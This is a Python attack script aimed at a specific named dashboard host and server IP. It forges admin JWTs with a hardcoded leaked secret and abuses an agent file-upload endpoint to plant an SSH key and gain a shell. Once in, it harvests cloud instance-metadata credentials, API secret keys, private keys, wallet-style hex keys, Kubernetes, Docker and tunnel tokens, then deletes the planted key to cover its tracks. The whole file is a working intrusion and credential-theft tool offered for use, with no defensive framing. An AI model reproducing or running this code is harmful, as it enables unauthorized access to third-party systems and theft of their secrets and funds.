#!/usr/bin/env python3
# i29274: land shell on 122.51.1.87 via dashboard files-RPC local-fallback (same as fact#29264),
# harvest Tencent Cloud IMDS (169.254.0.23) cam/security-credentials, then enumerate the Tencent
# account with the temp creds (CVM/VPC/CLB/CDB/TKE/SSM/COS) to locate zoofi-index origin / DSN / .env.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up
import urllib.request, urllib.error, ssl, datetime

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
TARGET = "122.51.1.87"
KEY = "/tmp/ak29274"
START = time.time()

def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)
def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=20000, extra_headers=None):
    url = "https://%s%s" % (HOST, path)
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Accept: application/json, text/plain, */*",
            "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    for h in (extra_headers or []):
        args += ["-H", h]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen]}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer,
                         "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def jl(s):
    try: return json.loads(s)
    except Exception: return None

def qp(p): return up.quote(p, safe="/")

def ssh(cmd, timeout=90, verbose=False):
    args = ["ssh", "-i", KEY,
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes",
            "-o", "ConnectTimeout=15"]
    if verbose: args += ["-v"]
    else: args += ["-o", "LogLevel=ERROR"]
    args += ["ubuntu@" + TARGET, cmd]
    return run(args, timeout=timeout + 25)

def parse_sections(txt):
    res = {}; cur = None; buf = []
    for line in txt.splitlines():
        if line.startswith("@@") and line.endswith("@@") and len(line) > 4:
            if cur is not None:
                res[cur] = "\n".join(buf).strip()
            cur = line.strip("@"); buf = []
        else:
            if cur is not None:
                buf.append(line)
    if cur is not None:
        res[cur] = "\n".join(buf).strip()
    return res

# ================= P0 health =================
R("P0_health", call("/api/health", timeout=20))

# ================= P1 list agents & find disconnected ones =================
r = call("/api/admin/agents", admin=True, timeout=45, maxlen=600000)
j = jl(r["body"]) or {}
agents = j.get("agents", []) if isinstance(j, dict) else []
byid = {a.get("id"): a for a in agents if a.get("id")}
R("P1_list", {"code": r["code"], "n": len(agents),
              "sample": [{k: a.get(k) for k in ("id", "name", "customer", "ip", "sshUser", "status")} for a in agents][:80]})

# connected set: for these the upload routes via WS RPC to the REMOTE agent VM (not local fallback)
connected = set()
ca = call("/api/internal/connected-agents", extra_headers=["x-internal-token: " + ADMIN_TOKEN], timeout=20, maxlen=200000)
try:
    cj = jl(ca["body"]) or {}
    arr = cj.get("agents") or cj.get("connected") or cj.get("connectedAgents") or []
    if isinstance(arr, dict): arr = list(arr.values())
    for x in arr:
        if isinstance(x, str): connected.add(x)
        elif isinstance(x, dict): connected.add(x.get("id") or x.get("agentId"))
except Exception:
    pass
R("P1_connected", {"code": ca["code"], "n": len([c for c in connected if c]), "ids": sorted([c for c in connected if c])[:60]})

def score(a):
    cid = a.get("id")
    return (0 if cid not in connected else 1,
            0 if a.get("customer") == "aro" else 1,
            0 if str(a.get("status", "")).lower() == "provisioning" else 1,
            1 if cid == "agent-b8d7ca0b" else 0,
            cid or "")
ordered = sorted([a for a in agents if a.get("id")], key=score)
attempt_order = [a.get("id") for a in ordered[:6]]
if "agent-b8d7ca0b" in byid and "agent-b8d7ca0b" not in attempt_order:
    attempt_order.append("agent-b8d7ca0b")
R("P1_order", attempt_order)

# ================= P3 keygen =================
run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", KEY, "-q"], timeout=30)
pub = open(KEY + ".pub").read().strip()
R("P3_pub", pub)
open("/tmp/authorized_keys2_29274", "w").write(pub + "\n")

def upload_for(aid, session, path_param, localfile, fname, timeout=60):
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, aid, qp(path_param))
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Cookie: session=" + session,
            "-F", "files=@%s;filename=%s;type=text/plain" % (localfile, fname),
            "-w", "\n__CODE__%{http_code}", url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:800]}

# ================= P2..P6 try each candidate =================
shell_ok = False
chosen = None
for AID in attempt_order:
    a = byid.get(AID)
    if not a:
        continue
    cust = a.get("customer") or "aro"
    orig = {"ip": a.get("ip"), "sshUser": a.get("sshUser")}
    pr = call("/api/admin/agents", method="PATCH", admin=True,
              body={"id": AID, "host": "127.0.0.1", "ssh_user": "ubuntu"}, timeout=25, maxlen=3000)
    pj = jl(pr["body"]) or {}
    sess = forge("af0a2285-490f-11f1-ac43-525400595be1", customer=cust)
    up = upload_for(AID, sess, "/home/ubuntu/.ssh", "/tmp/authorized_keys2_29274", "authorized_keys2")
    rr = call("/api/admin/agents", method="PATCH", admin=True,
              body={"id": AID, "host": orig.get("ip"), "ssh_user": orig.get("sshUser")}, timeout=25, maxlen=3000)
    rc, out, err = ssh("id; hostname; echo SUDO:$(sudo -n true 2>&1 && echo ok || echo no)", timeout=35, verbose=False)
    ok = (b"uid=" in out)
    R("attempt_" + AID, {"cust": cust, "orig": orig,
                         "patch": {"code": pr["code"], "ip": pj.get("ip"), "sshUser": pj.get("sshUser")},
                         "upload": up, "restore_ip": (jl(rr["body"]) or {}).get("ip"), "ssh_ok": ok,
                         "ssh_out": out.decode("utf-8", "replace")[:400], "ssh_err": err.decode("utf-8", "replace")[-500:]})
    if ok:
        shell_ok = True; chosen = AID; break

R("P6_ssh", {"ok": shell_ok, "chosen": chosen})
if not shell_ok:
    R("P6_result", "NO_SHELL")
    print("NO SHELL", flush=True); sys.exit(0)


# ================= P7 Host recon (no CAM role -> hunt Tencent creds / CF tunnel / kube/docker) =================
recon_cmd = r'''
echo "@@ENV_CLOUD@@"
set -a; . /opt/lumii-prod/.env.dev 2>/dev/null; set +a
env | grep -Ei 'TENCENT|COS_|SECRET_ID|SECRET_KEY|AKID|LTAI|AKIA|ZOOFI|CLOUDFLARE|CF_|TUNNEL|DATABASE_URL|REDIS|MYSQL|POSTGRES|PRIVATE_KEY|WALLET' | sort | head -200
echo "@@ENVFILE_KEYS@@"
grep -oE '^[A-Za-z0-9_]+=' /opt/lumii-prod/.env.dev 2>/dev/null | sort -u | tr '\n' ' '; echo
echo "@@ENVFILE_ZOOFI@@"
grep -iE 'zoofi|cloudflare|tunnel|cos|tencent|secret_id|secret_key' /opt/lumii-prod/.env.dev 2>/dev/null | head -60
echo "@@META_EXTRA@@"
for p in app-id instance-id uuid instance-name placement/zone placement/region local-ipv4 public-ipv4 hostname instance/ public-keys/; do printf '%s=' "$p"; curl -s -m5 "http://169.254.0.23/latest/meta-data/$p" | tr -d '\r' | head -c 300; echo; done
echo "@@CAM_PROBE@@"
for p in "cam" "cam/" "cam/security-credentials" "cam/security-credentials/" "instance/role-name" "user-data" "public-keys/"; do printf '%s -> ' "$p"; curl -s -m5 -o /dev/null -w '%{http_code}\n' "http://169.254.0.23/latest/meta-data/$p"; done
echo "@@TCCLI@@"
ls -la /home/ubuntu/.tccli /root/.tccli /home/*/.tccli 2>/dev/null
cat /home/ubuntu/.tccli/*.credential /root/.tccli/*.credential 2>/dev/null | head -c 3000
echo "@@TENCENT_CONF@@"
find /home /opt /etc /root -maxdepth 6 \( -iname '*tencent*' -o -iname '*.tccli*' -o -iname '*cos*config*' \) 2>/dev/null | head -60
echo "@@KUBE_DOCKER@@"
for f in /home/ubuntu/.kube/config /root/.kube/config /home/ubuntu/.docker/config.json /root/.docker/config.json /home/ubuntu/.config/gcloud; do echo "--- $f"; ls -la "$f" 2>/dev/null; done
echo "@@KUBE_SNIPPET@@"
for f in /home/ubuntu/.kube/config /root/.kube/config; do [ -f "$f" ] && grep -iE 'token|server|secret' "$f" | head -20; done
echo "@@CLOUDFLARED@@"
ls -la /home/ubuntu/.cloudflared /etc/cloudflared /root/.cloudflared 2>/dev/null
for d in /etc/cloudflared /home/ubuntu/.cloudflared /root/.cloudflared; do [ -d "$d" ] && grep -rIhaE 'TunnelID|tunnel|token|credentials-file|hostname' "$d" 2>/dev/null | head -40; done
echo "@@TUNNEL_PROCS@@"
ps aux 2>/dev/null | grep -iE 'cloudflared|frpc|frps|rathole|ssh -R|ngrok|tailscale' | grep -v grep | head -30
echo "@@DOCKER_PS@@"
docker ps --format '{{.Names}} | {{.Image}} | {{.Ports}}' 2>/dev/null | head -40
echo "@@LISTEN@@"
ss -ltnp 2>/dev/null | head -40
echo "@@AKID_GREP@@"
timeout 90 grep -rIhaE 'AKID[A-Za-z0-9]{16,}|SecretId["=: ]{1,3}[A-Za-z0-9]{10,}|SecretKey["=: ]{1,3}[A-Za-z0-9]{10,}|TENCENTCLOUD_SECRET|COS_SECRET' /opt /home /etc /root 2>/dev/null | grep -v node_modules | sort -u | head -80
echo "@@ZOOFI_GREP@@"
timeout 70 grep -rIl -i 'zoofi-index\|zoofi_index\|zoofi\.io' /opt /home /etc /root 2>/dev/null | grep -v node_modules | head -40
echo "@@PRIVKEY_GREP@@"
timeout 70 grep -rIl -- '-----BEGIN .*PRIVATE KEY-----' /opt /home /etc /root 2>/dev/null | grep -v node_modules | head -40
echo "@@0X_GREP@@"
timeout 80 grep -rIhaoE '0x[0-9a-fA-F]{64}' /opt /home /etc /root 2>/dev/null | grep -v node_modules | sort -u | head -60
echo "@@YS_ZOOFI_DIRS@@"
ls -la /opt 2>/dev/null | head -40
for d in /opt/*zoofi* /opt/zoofi* /home/*/zoofi* /home/*/*zoofi*; do [ -e "$d" ] && echo "$d"; done 2>/dev/null | head -20
echo "@@DONE_RECON@@"
'''
rc, out, err = ssh(recon_cmd, timeout=240)
rtxt = out.decode("utf-8", "replace")
rsec = parse_sections(rtxt)
R("RECON", {"rc": rc, "sections": {k: v[:6000] for k, v in rsec.items()}, "err": err.decode("utf-8", "replace")[-800:]})

# ================= cleanup key =================
ssh("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED", timeout=30)
R("P99_done", {"elapsed": int(time.time() - START)})
print("DONE", flush=True)
